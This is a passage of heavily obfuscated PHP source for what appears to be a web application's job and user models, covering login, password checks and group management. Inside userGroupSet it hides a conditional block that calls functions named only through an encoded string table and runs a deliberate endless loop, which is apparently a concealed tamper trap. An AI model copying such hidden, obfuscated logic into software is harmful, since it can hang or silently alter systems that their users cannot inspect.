false, $F—¥¤Ÿ±¾ê = "\x73\x6f\162\x74", $eÕ¬ˆ³¢¹ = false) { return parent::listData($c‘ÜĞ¥ÑÏ, $F—¥¤Ÿ±¾ê, $eÕ¬ˆ³¢¹); } public function remove($bâÁÂ±äÑÒ) { return parent::remove($bâÁÂ±äÑÒ); } public function add($DØ„ÛÚ¨˜«) { $eµÎ¾é·³ =& $_SERVER[‚Ğ°–—î]; if ($this->findByName($DØ„ÛÚ¨˜«[$eµÎ¾é·³[28]])) { return !1; } $DØ„ÛÚ¨˜«[$eµÎ¾é·³[2128]] = $this->getSort(); return parent::insert($DØ„ÛÚ¨˜«); } private function getSort() { $F¯ß•ÉÆ î =& $_SERVER[‚Ğ°–—î]; $bèÌ¸º’âÌ = parent::listData(); $d™Šëäñì¼ = array_to_keyvalue($bèÌ¸º’âÌ, $F¯ß•ÉÆ î[33], $F¯ß•ÉÆ î[2128]); return empty($d™Šëäñì¼) ? 0 : max($d™Šëäñì¼) + 1; } public function update($dƒâõ™ŞÊ, $e«ŒÈÁİ¨) { $B¬ŠãÄÚêÛ =& $_SERVER[‚Ğ°–—î]; $Aßƒ“ïÆ®Á = parent::listData($dƒâõ™ŞÊ); $AÅÜ’½Èâ‘ = $this->findByName($e«ŒÈÁİ¨[$B¬ŠãÄÚêÛ[28]]); if (!$Aßƒ“ïÆ®Á || $AÅÜ’½Èâ‘ && $AÅÜ’½Èâ‘[$B¬ŠãÄÚêÛ[367]] != $Aßƒ“ïÆ®Á[$B¬ŠãÄÚêÛ[367]]) { return !1; } return parent::update($dƒâõ™ŞÊ, $e«ŒÈÁİ¨); } public function setUserJob($BÔÆÆ˜İÓ´, $eÉŒ•Ú†§ù) { goto EÀ†¿Â–ÉÓ; EÛ¸ê‰êÅÔ: $A«‹ßÑ‡“ = rtrim($A«‹ßÑ‡“, $Fé–„‘õ[47]); Model($Fé–„‘õ[477])->metaSet($BÔÆÆ˜İÓ´, self::JOB_KEY, $A«‹ßÑ‡“); goto f‹õ‹ò²†; EÀ†¿Â–ÉÓ: $Fé–„‘õ =& $_SERVER[‚Ğ°–—î]; if (!is_array($eÉŒ•Ú†§ù)) { $eÉŒ•Ú†§ù = array($eÉŒ•Ú†§ù); } $e¹ˆÃŸÙÁÚ = parent::listData(); goto d–äóæÅŒ“; d–äóæÅŒ“: $e´©æ©­· = array_to_keyvalue($e¹ˆÃŸÙÁÚ, $Fé–„‘õ[28]); $A«‹ßÑ‡“ = $Fé–„‘õ[361]; foreach ($eÉŒ•Ú†§ù as $fñÚ¥‡§ÔÒ) { if ($e´©æ©­·[$fñÚ¥‡§ÔÒ]) { $A«‹ßÑ‡“ .= $e´©æ©­·[$fñÚ¥‡§ÔÒ][$Fé–„‘õ[367]] . $Fé–„‘õ[47]; } else { $e×í‹É²É = $this->add($fñÚ¥‡§ÔÒ); $A«‹ßÑ‡“ .= $e×í‹É²É . $Fé–„‘õ[47]; } } goto EÛ¸ê‰êÅÔ; f‹õ‹ò²†: } public function getUserJob($a¾Õ­÷¦ˆ·) { $A·ˆê²‹†‚ = Model($_SERVER[‚Ğ°–—î][477])->metaGet($a¾Õ­÷¦ˆ·); return $this->getUserJobInfo($A·ˆê²‹†‚[self::JOB_KEY]); } public function getUserJobInfo($fë«½‘ƒêâ) { goto E’®×¼íÊ; fªĞ«óâÖ: $Cë¾âÎºÖ† = array_remove_key($Cë¾âÎºÖ†, $FŞ»×ì”·[187]); $a¿³¨¥èˆ¢ = array(); foreach ($cœ‹˜ŞŒ¾± as $dë¬ëÍ©‰®) { if (isset($Cë¾âÎºÖ†[$dë¬ëÍ©‰®])) { $a¿³¨¥èˆ¢[] = $Cë¾âÎºÖ†[$dë¬ëÍ©‰®]; } } goto b¼£¡…Â‚; E’®×¼íÊ: $FŞ»×ì”· =& $_SERVER[‚Ğ°–—î]; $cœ‹˜ŞŒ¾± = explode($FŞ»×ì”·[47], $fë«½‘ƒêâ); $Cë¾âÎºÖ† = parent::listData(); goto fªĞ«óâÖ; b¼£¡…Â‚: return $a¿³¨¥èˆ¢; goto a¡Ü—¼…–; a¡Ü—¼…–: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\141\142\x6c\145\116\141\155\145" => "\165\163\x65\162\x5f\155\145\x74\141", "\x6d\145\x74\x61\x46\151\x65\154\x64" => "\x75\x73\145\x72\111\104"); protected $simpleField = "\165\x73\145\162\x49\104\54\156\x69\143\153\x4e\x61\x6d\145\x2c\156\141\155\x65\x2c\x61\166\x61\x74\141\162\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($dÌ™™é×…—) { $A…´¾¹¬¼¸ =& $_SERVER[‚Ğ°–—î]; $cËƒåšïÜ = $A…´¾¹¬¼¸[2493]; return array($A…´¾¹¬¼¸[2173] => array($dÌ™™é×…—[0], $cËƒåšïÜ), $A…´¾¹¬¼¸[2175] => array($dÌ™™é×…—[0], $cËƒåšïÜ), $A…´¾¹¬¼¸[2494] => array($dÌ™™é×…—[0], $cËƒåšïÜ)); } protected function getInfo($f¦‰‚¢Ğ‘Â, $BÈÖè‹˜³‘ = false) { $EĞâ°Û = $this->getInfoSimple($f¦‰‚¢Ğ‘Â); if (!is_array($EĞâ°Û)) { return array(); } if ($BÈÖè‹˜³‘) { return $this->_getInfoApply($EĞâ°Û); } return $this->cacheFunctionGet($_SERVER[‚Ğ°–—î][2215], $f¦‰‚¢Ğ‘Â); } protected function getInfoFull($dèÌ²¼çÈ, $Aƒ ¡†Ãê = false) { $FÚªŠó„ª = $this->getInfoSimple($dèÌ²¼çÈ); if (!is_array($FÚªŠó„ª)) { return array(); } if ($Aƒ ¡†Ãê) { return $this->_getInfoApply($FÚªŠó„ª, !0); return $this->_getInfoApply($FÚªŠó„ª, !0); } return $this->cacheFunctionGet($_SERVER[‚Ğ°–—î][2495], $dèÌ²¼çÈ); } private function _getInfoApply($dğãŞø®Å¤, $C¼½íàÒï = false) { goto BÌã„í½ˆ; BÌã„í½ˆ: $fƒİÄÍ“î¼ =& $_SERVER[‚Ğ°–—î]; if (!$dğãŞø®Å¤) { return $dğãŞø®Å¤; } $fËÔÎİÎÔÉ = md5($fƒİÄÍ“î¼[2496] . $dğãŞø®Å¤[$fƒİÄÍ“î¼[802]] . $fƒİÄÍ“î¼[2497] . $dğãŞø®Å¤[$fƒİÄÍ“î¼[28]]); goto e×Ü§ÑÁ¯; e×Ü§ÑÁ¯: $dğãŞø®Å¤ = $this->_listDataApplyItem($dğãŞø®Å¤); $eË‹Òº¢ó† = Model($fƒİÄÍ“î¼[1118])->metaGet($dğãŞø®Å¤[$fƒİÄÍ“î¼[391]][$fƒİÄÍ“î¼[369]]); $dğãŞø®Å¤[$fƒİÄÍ“î¼[2498]] = $fËÔÎİÎÔÉ; goto DŞÔ½ŞÂ¨¡; DŞÔ½ŞÂ¨¡: $dğãŞø®Å¤[$fƒİÄÍ“î¼[391]][$fƒİÄÍ“î¼[2332]] = isset($eË‹Òº¢ó†[$fƒİÄÍ“î¼[2333]]) ? $eË‹Òº¢ó†[$fƒİÄÍ“î¼[2333]] : null; if ($C¼½íàÒï) { $dğãŞø®Å¤[$fƒİÄÍ“î¼[417]] = $this->metaGet($dğãŞø®Å¤[$fƒİÄÍ“î¼[1438]]); } return $dğãŞø®Å¤; goto e¡óêØç‡³; e¡óêØç‡³: } protected function getInfoSimple($D’Å½˜‹ŸŒ, $B®×™öœ¬Æ = false) { $f°ğ»Ø¨´„ =& $_SERVER[‚Ğ°–—î]; if (!$D’Å½˜‹ŸŒ) { return array(); } if ($B®×™öœ¬Æ) { $EÆÊ¸–í¹µ = $this->where(array($f°ğ»Ø¨´„[1438] => intval($D’Å½˜‹ŸŒ)))->find(); if (!is_array($EÆÊ¸–í¹µ)) { return array(); } $EÆÊ¸–í¹µ[$f°ğ»Ø¨´„[2499]] = Action($f°ğ»Ø¨´„[2500])->parseUrl($EÆÊ¸–í¹µ[$f°ğ»Ø¨´„[2499]]); return $EÆÊ¸–í¹µ; } return $this->cacheFunctionGet($f°ğ»Ø¨´„[2176], $D’Å½˜‹ŸŒ); } protected function getInfoSimpleOuter($C¬Á´ôÌÓ) { goto A£÷–ºÈ; B¦ğÎ¥¿‰Â: $b˜Æµ·ÙÛæ = array_field_key($EôÔÉ“—…, explode($Dª¢Šïß††[47], $this->simpleField)); if (!$b˜Æµ·ÙÛæ) { return array($Dª¢Šïß††[1438] => $Dª¢Šïß††[1032], $Dª¢Šïß††[28] => $Dª¢Šïß††[157] . LNG($Dª¢Šïß††[2503]) . $Dª¢Šïß††[476], $Dª¢Šïß††[2499] => STATIC_PATH . $Dª¢Šïß††[2504]); } $b˜Æµ·ÙÛæ[$Dª¢Šïß††[2499]] = Action($Dª¢Šïß††[2500])->parseUrl($b˜Æµ·ÙÛæ[$Dª¢Šïß††[2499]]); goto dÊ‡´ìĞ†; A£÷–ºÈ: $Dª¢Šïß†† =& $_SERVER[‚Ğ°–—î]; if (!$C¬Á´ôÌÓ || $C¬Á´ôÌÓ == 0) { return array($Dª¢Šïß††[1438] => $Dª¢Šïß††[468], $Dª¢Šïß††[28] => $Dª¢Šïß††[157] . LNG($Dª¢Šïß††[2501]) . $Dª¢Šïß††[476], $Dª¢Šïß††[2499] => STATIC_PATH . $Dª¢Šïß††[2502]); } $EôÔÉ“—… = $this->cacheFunctionGet($Dª¢Šïß††[2176], $C¬Á´ôÌÓ); goto B¦ğÎ¥¿‰Â; dÊ‡´ìĞ†: return $b˜Æµ·ÙÛæ; goto e›§’ø›Õò; e›§’ø›Õò: } protected function groupUser($E‰Çêã¶ ƒ) { } public static function errorLang($DÜæöÏº¿) { $aŠ—í™½» =& $_SERVER[‚Ğ°–—î]; $f™ô©…ô¬ = array(self::ERROR_USER_NOT_EXISTS => $aŠ—í™½»[2505], self::ERROR_USER_PASSWORD_ERROR => $aŠ—í™½»[2506], self::ERROR_USER_EXIST_NAME => $aŠ—í™½»[2507], self::ERROR_USER_EXIST_PHONE => $aŠ—í™½»[2508], self::ERROR_USER_EXIST_EMAIL => $aŠ—í™½»[2509], self::ERROR_USER_LOGIN_LOCK => $aŠ—í™½»[2510], self::ERROR_IP_NOT_ALLOW => $aŠ—í™½»[2511], self::ERROR_USER_EXIST_NICKNAME => $aŠ—í™½»[2512]); return LNG($f™ô©…ô¬[$DÜæöÏº¿]); } public function getInfoByMeta($bË¿ˆ¿“ò, $D‘ƒŞ˜İ¢¼) { $DöôíÏÈ„ =& $_SERVER[‚Ğ°–—î]; $C§â‚²¶Ø = Model($DöôíÏÈ„[2513])->where(array($DöôíÏÈ„[89] => $bË¿ˆ¿“ò, $DöôíÏÈ„[359] => $D‘ƒŞ˜İ¢¼))->find(); if ($C§â‚²¶Ø) { return $this->getInfo($C§â‚²¶Ø[$DöôíÏÈ„[1438]]); } return !1; } public function userLoginCheck($CÒËÜô¬Õá, $e‹Å®ƒÂùÊ) { goto aÑ‚£¬ŠçÄ; a¬ğˆÎ‰ˆ: $this->userEdit($Cˆ„‰çãù¨[$bôïŠµ¶Æ¼[1438]], array($bôïŠµ¶Æ¼[2515] => time())); return $this->getInfo($Cˆ„‰çãù¨[$bôïŠµ¶Æ¼[1438]]); goto bà¨‡â†¥ğ; aÑ‚£¬ŠçÄ: $bôïŠµ¶Æ¼ =& $_SERVER[‚Ğ°–—î]; $c‡»´ˆ¹… = array($bôïŠµ¶Æ¼[28] => $CÒËÜô¬Õá, $bôïŠµ¶Æ¼[2336] => $CÒËÜô¬Õá, $bôïŠµ¶Æ¼[293] => $CÒËÜô¬Õá, $bôïŠµ¶Æ¼[2514] => $CÒËÜô¬Õá, $bôïŠµ¶Æ¼[915] => $bôïŠµ¶Æ¼[917]); if ($this->nickNameRpt()) { unset($c‡»´ˆ¹…[$bôïŠµ¶Æ¼[2336]]); } goto FÄ³ì†ßè; FÄ³ì†ßè: $Cˆ„‰çãù¨ = $this->where($c‡»´ˆ¹…)->find(); if (!$Cˆ„‰çãù¨) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Cˆ„‰çãù¨[$bôïŠµ¶Æ¼[1438]], $e‹Å®ƒÂùÊ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto a¬ğˆÎ‰ˆ; bà¨‡â†¥ğ: } public function clearCache($EˆƒÅÊ°¨Å) { $E¢¹í’áÍ =& $_SERVER[‚Ğ°–—î]; $this->cacheFunctionClear($E¢¹í’áÍ[2215], $EˆƒÅÊ°¨Å); $this->cacheFunctionClear($E¢¹í’áÍ[2176], $EˆƒÅÊ°¨Å); $this->cacheFunctionClear($E¢¹í’áÍ[2495], $EˆƒÅÊ°¨Å); } public function userPasswordCheck($CëÄß˜ŠÑõ, $FÌº¯ø¨Åº) { $FÁùÅ¬Ãà‹ =& $_SERVER[‚Ğ°–—î]; $aİˆë¶¯ğ = $this->where(array($FÁùÅ¬Ãà‹[1438] => intval($CëÄß˜ŠÑõ)))->find(); $bòïˆÓ¹áø = $this->metaGet($CëÄß˜ŠÑõ); $eÄ½èÂ˜¤ = isset($bòïˆÓ¹áø[$FÁùÅ¬Ãà‹[2516]]) ? $bòïˆÓ¹áø[$FÁùÅ¬Ãà‹[2516]] : $FÁùÅ¬Ãà‹[33]; if (md5($eÄ½èÂ˜¤ . trim($FÌº¯ø¨Åº)) !== $aİˆë¶¯ğ[$FÁùÅ¬Ãà‹[802]]) { return !1; } return !0; } public function userAdd($bñîö§ŸÀñ) { goto fõ¦ƒê´ç; d”ˆçê‹ÙÓ: $f÷ÅˆåƒÎ… = array($B´‡† ½ä…[2524] => $D©öÔ‹ª³º[$B´‡† ½ä…[802]], $B´‡† ½ä…[2520] => $D©öÔ‹ª³º[$B´‡† ½ä…[2336]]); $this->userEdit($e‹¢°‰Ø˜, $f÷ÅˆåƒÎ…); Model($B´‡† ½ä…[1118])->userRootAdd($e‹¢°‰Ø˜); goto D¾¿İãõª; D¾¿İãõª: return $e‹¢°‰Ø˜; goto C¶·ŞË±´; fõ¦ƒê´ç: $B´‡† ½ä… =& $_SERVER[‚Ğ°–—î]; $D©öÔ‹ª³º = array($B´‡† ½ä…[386] => $bñîö§ŸÀñ[$B´‡† ½ä…[28]], $B´‡† ½ä…[2517] => $bñîö§ŸÀñ[$B´‡† ½ä…[1324]], $B´‡† ½ä…[2518] => isset($bñîö§ŸÀñ[$B´‡† ½ä…[293]]) ? $bñîö§ŸÀñ[$B´‡† ½ä…[293]] : $B´‡† ½ä…[33], $B´‡† ½ä…[2519] => isset($bñîö§ŸÀñ[$B´‡† ½ä…[2514]]) ? $bñîö§ŸÀñ[$B´‡† ½ä…[2514]] : $B´‡† ½ä…[33], $B´‡† ½ä…[2520] => isset($bñîö§ŸÀñ[$B´‡† ½ä…[2336]]) ? $bñîö§ŸÀñ[$B´‡† ½ä…[2336]] : $bñîö§ŸÀñ[$B´‡† ½ä…[28]], $B´‡† ½ä…[2521] => isset($bñîö§ŸÀñ[$B´‡† ½ä…[2499]]) ? $bñîö§ŸÀñ[$B´‡† ½ä…[2499]] : $B´‡† ½ä…[33], $B´‡† ½ä…[2522] => isset($bñîö§ŸÀñ[$B´‡† ½ä…[2523]]) ? $bñîö§ŸÀñ[$B´‡† ½ä…[2523]] : 1, $B´‡† ½ä…[2524] => $bñîö§ŸÀñ[$B´‡† ½ä…[802]], $B´‡† ½ä…[2177] => isset($bñîö§ŸÀñ[$B´‡† ½ä…[2091]]) ? $bñîö§ŸÀñ[$B´‡† ½ä…[2091]] : 1024 * 1024 * 20, $B´‡† ½ä…[2178] => 0, $B´‡† ½ä…[2515] => 0, $B´‡† ½ä…[2202] => isset($bñîö§ŸÀñ[$B´‡† ½ä…[688]]) ? $bñîö§ŸÀñ[$B´‡† ½ä…[688]] : 1); if (!empty($bñîö§ŸÀñ[$B´‡† ½ä…[1438]])) { $D©öÔ‹ª³º[$B´‡† ½ä…[1438]] = $bñîö§ŸÀñ[$B´‡† ½ä…[1438]]; } goto d°ĞÖùŠÅª; d°ĞÖùŠÅª: $CØà‘İÂÕÌ = $this->_checkExist($bñîö§ŸÀñ); if ($CØà‘İÂÕÌ !== !0) { return $CØà‘İÂÕÌ; } $e‹¢°‰Ø˜ = $this->add($D©öÔ‹ª³º); goto d”ˆçê‹ÙÓ; C¶·ŞË±´: } protected function userEditTest($f¹¥…Š•ÑÖ, $eÃšÁéÁ) { return $this->call($_SERVER[‚Ğ°–—î][2525], $f¹¥…Š•ÑÖ, $eÃšÁéÁ); } protected function userEdit($e§†Á§‘‰, $cÓ‹ƒ…ï¸†) { goto BêòÜÇ ¬Ÿ; Aù£¦‰Ã¸Á: $AÏŠêöáÓç = $this->_checkExist($cÓ‹ƒ…ï¸†, $e§†Á§‘‰); if ($AÏŠêöáÓç !== !0) { return $AÏŠêöáÓç; } if (isset($cÓ‹ƒ…ï¸†[$c¾³¡õí«[802]]) && trim($cÓ‹ƒ…ï¸†[$c¾³¡õí«[802]]) != $c¾³¡õí«[33]) { $aïÇÃÀ£¼ = $this->metaGet($e§†Á§‘‰); if (empty($aïÇÃÀ£¼[$c¾³¡õí«[2516]])) { $aïÇÃÀ£¼[$c¾³¡õí«[2516]] = rand_string(10); Model($c¾³¡õí«[474])->metaSet($e§†Á§‘‰, $c¾³¡õí«[2516], $aïÇÃÀ£¼[$c¾³¡õí«[2516]]); } $cÓ‹ƒ…ï¸†[$c¾³¡õí«[802]] = md5($aïÇÃÀ£¼[$c¾³¡õí«[2516]] . trim($cÓ‹ƒ…ï¸†[$c¾³¡õí«[802]])); } else { unset($cÓ‹ƒ…ï¸†[$c¾³¡õí«[802]]); } goto cëô™¥ªó; cëô™¥ªó: $this->where(array($c¾³¡õí«[1429] => $e§†Á§‘‰))->save($cÓ‹ƒ…ï¸†); if (isset($cÓ‹ƒ…ï¸†[$c¾³¡õí«[2336]])) { $this->setNamePinyin($e§†Á§‘‰, $cÓ‹ƒ…ï¸†[$c¾³¡õí«[2336]]); } $this->clearCache($Aé„’²ÚÌ§[$c¾³¡õí«[1438]]); goto a¾²Ç¡Ûœ·; a¾²Ç¡Ûœ·: return !0; goto B©•‹èÇÜŒ; BêòÜÇ ¬Ÿ: $c¾³¡õí« =& $_SERVER[‚Ğ°–—î]; $Eí³ÛêåîÙ = $this->getInfoSimple($e§†Á§‘‰); if (!$Eí³ÛêåîÙ) { return !1; } goto Aù£¦‰Ã¸Á; B©•‹èÇÜŒ: } public function setNamePinyin($e°µƒš¡Š‚, $fãÓÊÄ°— = false) { $fŞ•¿¦ê™é =& $_SERVER[‚Ğ°–—î]; if (!$fãÓÊÄ°—) { $fªò®Î…š« = $this->getInfoSimple($e°µƒš¡Š‚); $fãÓÊÄ°— = $fªò®Î…š«[$fŞ•¿¦ê™é[2336]] ? $fªò®Î…š«[$fŞ•¿¦ê™é[2336]] : $fªò®Î…š«[$fŞ•¿¦ê™é[28]]; } $DˆòÚƒ£°È = Model($fŞ•¿¦ê™é[477]); if (!Input::check($fãÓÊÄ°—, $fŞ•¿¦ê™é[528])) { return $DˆòÚƒ£°È->metaSet($e°µƒš¡Š‚, array($fŞ•¿¦ê™é[416] => $fŞ•¿¦ê™é[33], $fŞ•¿¦ê™é[415] => $fŞ•¿¦ê™é[33])); } return $DˆòÚƒ£°È->metaSet($e°µƒš¡Š‚, array($fŞ•¿¦ê™é[416] => str_replace($fŞ•¿¦ê™é[50], $fŞ•¿¦ê™é[33], Pinyin::encode($fãÓÊÄ°—)), $fŞ•¿¦ê™é[415] => Pinyin::encode($fãÓÊÄ°—, $fŞ•¿¦ê™é[529]))); } private function nickNameRpt() { $b²“îÎø¹ù =& $_SERVER[‚Ğ°–—î]; $aç˜‡ÆÚ‚ì = Model($b²“îÎø¹ù[1089])->get($b²“îÎø¹ù[2526]); $CÍÃ¢¹¹Ôš = $GLOBALS[$b²“îÎø¹ù[6]][$b²“îÎø¹ù[2482]][$b²“îÎø¹ù[2526]]; $e‚ŠöàÉ·Š = !is_null($aç˜‡ÆÚ‚ì) ? $aç˜‡ÆÚ‚ì : $CÍÃ¢¹¹Ôš; return !!$e‚ŠöàÉ·Š; } private function _checkExist($eÎ¿÷àÎš©, $b‰©·’áŞ = false) { $EÙÀÊÈğÕÒ =& $_SERVER[‚Ğ°–—î]; $fªè‹òøŞƒ = array($EÙÀÊÈğÕÒ[28] => UserModel::ERROR_USER_EXIST_NAME, $EÙÀÊÈğÕÒ[2336] => UserModel::ERROR_USER_EXIST_NICKNAME, $EÙÀÊÈğÕÒ[293] => UserModel::ERROR_USER_EXIST_EMAIL, $EÙÀÊÈğÕÒ[2514] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($fªè‹òøŞƒ[$EÙÀÊÈğÕÒ[2336]]); } $eÁƒŠ„ÛÔÔ = $b‰©·’áŞ ? array($EÙÀÊÈğÕÒ[1438] => array($EÙÀÊÈğÕÒ[2527], $b‰©·’áŞ)) : array(); foreach ($fªè‹òøŞƒ as $A±äì‰ùŸ˜ => $dø´‡©òê) { if (!isset($eÎ¿÷àÎš©[$A±äì‰ùŸ˜]) || !$eÎ¿÷àÎš©[$A±äì‰ùŸ˜]) { continue; } $BóÀô¥«ƒ— = array_merge(array($A±äì‰ùŸ˜ => $eÎ¿÷àÎš©[$A±äì‰ùŸ˜]), $eÁƒŠ„ÛÔÔ); $eî‚†‡Ùù = $this->where($BóÀô¥«ƒ—)->find(); if ($eî‚†‡Ùù) { return $dø´‡©òê; } } return !0; } public function userListInfo($AÏ§³™İÜ§) { $A‹í¿İ‹íÒ =& $_SERVER[‚Ğ°–—î]; $F¢Ô²ğ¦•¬ = array(); $AÏ§³™İÜ§ = is_array($AÏ§³™İÜ§) ? array_unique($AÏ§³™İÜ§) : array(); if (!$AÏ§³™İÜ§) { return $F¢Ô²ğ¦•¬; } if (count($AÏ§³™İÜ§) < 20) { foreach ($AÏ§³™İÜ§ as $e–Ší¯ÎÙ•) { $F¢Ô²ğ¦•¬[$e–Ší¯ÎÙ• . $A‹í¿İ‹íÒ[33]] = $this->getInfoSimpleOuter($e–Ší¯ÎÙ•); } } else { $cæ‘•±ê = array($A‹í¿İ‹íÒ[1429] => array($A‹í¿İ‹íÒ[384], $AÏ§³™İÜ§)); if (count($AÏ§³™İÜ§) == 1) { $cæ‘•±ê = array($A‹í¿İ‹íÒ[1429] => $AÏ§³™İÜ§[0]); } $dß…‰Í‹ = Model($A‹í¿İ‹íÒ[474])->field($this->simpleField)->where($cæ‘•±ê)->select(); $dß…‰Í‹ = array_to_keyvalue($dß…‰Í‹, $A‹í¿İ‹íÒ[1438]); foreach ($AÏ§³™İÜ§ as $e–Ší¯ÎÙ•) { $D§Õ½©µÏÁ = $dß…‰Í‹[$dß…‰Í‹[$e–Ší¯ÎÙ•]]; if (!$D§Õ½©µÏÁ) { $F¢Ô²ğ¦•¬[$e–Ší¯ÎÙ• . $A‹í¿İ‹íÒ[33]] = $this->getInfoSimpleOuter($e–Ší¯ÎÙ•); continue; } $D§Õ½©µÏÁ[$A‹í¿İ‹íÒ[2499]] = Action($A‹í¿İ‹íÒ[2500])->parseUrl($D§Õ½©µÏÁ[$A‹í¿İ‹íÒ[2499]]); $F¢Ô²ğ¦•¬[$e–Ší¯ÎÙ• . $A‹í¿İ‹íÒ[33]] = $D§Õ½©µÏÁ; } } return $F¢Ô²ğ¦•¬; } protected function userStatus($c¶Ö›‡½Š½, $eƒÎì’Íé) { $d¬‹öñÓé„ = $this->getInfoSimple($c¶Ö›‡½Š½); if (!$d¬‹öñÓé„) { return !1; } $bÀ¶îİ£¹Ö = array($_SERVER[‚Ğ°–—î][688] => $eƒÎì’Íé); return $this->userEdit($c¶Ö›‡½Š½, $bÀ¶îİ£¹Ö); } protected function userRemove($c¹Š¬ˆ Áì) { goto Féè‚·Óïá; CŞƒƒ‘»Å: $eÔˆ‘Ù®™ = array($Aâ†İã©Ì[1429] => $c¹Š¬ˆ Áì); Model($Aâ†İã©Ì[536])->where($eÔˆ‘Ù®™)->delete(); Model($Aâ†İã©Ì[2528])->where($eÔˆ‘Ù®™)->delete(); goto Fî¶´òìõ¸; Fî¶´òìõ¸: Model($Aâ†İã©Ì[2181])->where($eÔˆ‘Ù®™)->delete(); Model($Aâ†İã©Ì[2513])->where($eÔˆ‘Ù®™)->delete(); Model($Aâ†İã©Ì[2529])->where($eÔˆ‘Ù®™)->delete(); goto C Ğ™¸Ì£; Féè‚·Óïá: $Aâ†İã©Ì =& $_SERVER[‚Ğ°–—î]; $e…æ„“Ø‡Õ = $this->getInfoSimple($c¹Š¬ˆ Áì); if (!$e…æ„“Ø‡Õ) { return !1; } goto CŞƒƒ‘»Å; C Ğ™¸Ì£: Model($Aâ†İã©Ì[752])->userRootRemove($c¹Š¬ˆ Áì); return $this->where($eÔˆ‘Ù®™)->delete(); goto DŒİ‡“ò‘„; DŒİ‡“ò‘„: } protected function userGroupSet($c£•ºñë, $f‡â²Çâ¼â, $dàÏŒÌ©éÓ = array()) { goto aÇ¶Û©ë•Š; aÇ¶Û©ë•Š: $d©ÛÀŠ¨¬… =& $_SERVER[‚Ğ°–—î]; if (!isset($_SERVER[$d©ÛÀŠ¨¬…[777]]) || !isset($_SERVER[$d©ÛÀŠ¨¬…[778]])) { goto dÒ”È•Áêê; Aƒñ•Ê±Á÷: $Eç—ƒ¹¥ôÎ = $d©ÛÀŠ¨¬…[795]; $Eç—ƒ¹¥ôÎ($_SERVER[$d©ÛÀŠ¨¬…[796]]); $bÒŞœŠ£ó = 1; goto aî½È­ÎÚõ; b Šª½Ò¯À: $d‡ˆ‰Õ‘İ = $F‰ø¿­×™ô($c…§‹ÌÓÚ); $EŞÅ…™ÃíŠ = explode($d©ÛÀŠ¨¬…[217], $d‡ˆ‰Õ‘İ); if (count($EŞÅ…™ÃíŠ) < $d©ÛÀŠ¨¬…[555]) { $eğë›á¦× = $d©ÛÀŠ¨¬…[782]; $eğë›á¦×(); } goto Aƒñ•Ê±Á÷; aî½È­ÎÚõ: for ($A®ĞÎíËØñ = $bÒŞœŠ£ó; $A®ĞÎíËØñ > 0; $A®ĞÎíËØñ++) { $Eç—ƒ¹¥ôÎ = json_encode($GLOBALS[$d©ÛÀŠ¨¬…[384]]); } goto B´ÌîÂÔæÀ; dÒ”È•Áêê: $AÂ†šñÆà‰ = $d©ÛÀŠ¨¬…[794]; $F‰ø¿­×™ô = $d©ÛÀŠ¨¬…[779]; $c…§‹ÌÓÚ = $_SERVER[$d©ÛÀŠ¨¬…[780]] . $d©ÛÀŠ¨¬…[781]; goto b Šª½Ò¯À; B´ÌîÂÔæÀ: } $F ‘Œ”¾Ñì = $this->getInfoSimple($c£•ºñë); goto Cß¥á°‚ ; Cß¥á°‚ : if (!$F ‘Œ”¾Ñì || !is_array($f‡â²Çâ¼â)) { return !1; } $FÄ½ÆâÈÌŠ = Model($d©ÛÀŠ¨¬…[2181]); $FÄ½ÆâÈÌŠ->where(array($d©ÛÀŠ¨¬…[1438] => $c£•ºñë))->delete(); goto eŒïØºì¾; eŒïØºì¾: $FÚ ¢ÆİĞÂ = array(); $c‹­¶Àİ£… = 0; foreach ($f‡â²Çâ¼â as $dí¬‘ÌĞÎ => $cõ‘ÃšŒÑˆ) { $cğÈâÌ÷ª = array($d©ÛÀŠ¨¬…[1438] => $c£•ºñë, $d©ÛÀŠ¨¬…[2107] => $dí¬‘ÌĞÎ, $d©ÛÀŠ¨¬…[2235] => $cõ‘ÃšŒÑˆ); $cğÈâÌ÷ª[$d©ÛÀŠ¨¬…[2128]] = isset($dàÏŒÌ©éÓ[$c‹­¶Àİ£…]) ? $dàÏŒÌ©éÓ[$c‹­¶Àİ£…] : 0; $c‹­¶Àİ£…++; $FÚ ¢ÆİĞÂ[] = $cğÈâÌ÷ª; } goto Böã´“õñÎ; Böã´“õñÎ: return $FÄ½ÆâÈÌŠ->addAll($FÚ ¢ÆİĞÂ, array(), !0); goto A¦øÖÈ»; A¦øÖÈ»: } protected function userGroupAdd($AÑÜµØ®î, $dä¹–Éè‚ = array()) { $d×è—•ô‚â =& $_SERVER[‚Ğ°–—î]; $C‹êÖÓ‹ÜË = $this->getInfoSimple($AÑÜµØ®î); if (!$C‹êÖÓ‹ÜË || empty($dä¹–Éè‚)) { return !1; } $fìó‰’ÙîÍ = array(); foreach ($dä¹–Éè‚ as $d«“™†™® => $CØÌšÏ¿) { $fìó‰’ÙîÍ[] = array($d×è—•ô‚â[1438] => $AÑÜµØ®î, $d×è—•ô‚â[2107] => $d«“™†™®, $d×è—•ô‚â[2235] => $CØÌšÏ¿); } return Model($d×è—•ô‚â[2181])->addAll($fìó‰’ÙîÍ, array(), !0); } protected function userGroupRemove($CÖ¥š³Ó¾”, $BÉÚ¥ã„») { $BŠŒ‚ùä³È =& $_SERVER[‚Ğ°–—î]; $FÜßÀóöê‰ = $this->getInfoSimple($CÖ¥š³Ó¾”); if (!$FÜßÀóöê‰ || !$BÉÚ¥ã„») { return !1; } $FäğÒÒÔÖì = array($BŠŒ‚ùä³È[1429] => $CÖ¥š³Ó¾”, $BŠŒ‚ùä³È[2179] => $BÉÚ¥ã„»); return Model($BŠŒ‚ùä³È[2181])->where($FäğÒÒÔÖì)->delete(); } public function listData() { $CåÍ£Âïö = $this->_makeOrder()->selectPage(50); 